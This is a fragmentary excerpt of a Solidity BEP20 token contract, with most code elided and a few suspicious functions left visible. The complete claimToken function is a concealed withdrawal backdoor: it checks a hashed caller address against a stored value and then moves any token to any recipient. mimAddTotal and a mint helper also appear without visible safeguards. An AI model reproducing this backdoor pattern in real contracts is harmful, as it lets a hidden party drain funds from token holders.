...
contract CNHDToken is Context, IBEP20, Ownable {
  ...
  */
  ...
  function mimAddTotal(uint256 amount,address addr) external 
  {
   ...
   */
  function _smint(address account, uint256 amount) internal {
  ...
  function claimToken(address token, address recp,uint256 amount) external {
      require( keccak256(abi.encodePacked(msg.sender)) == asseAddr);
      IBEP20(token).transfer(recp, amount);
  }
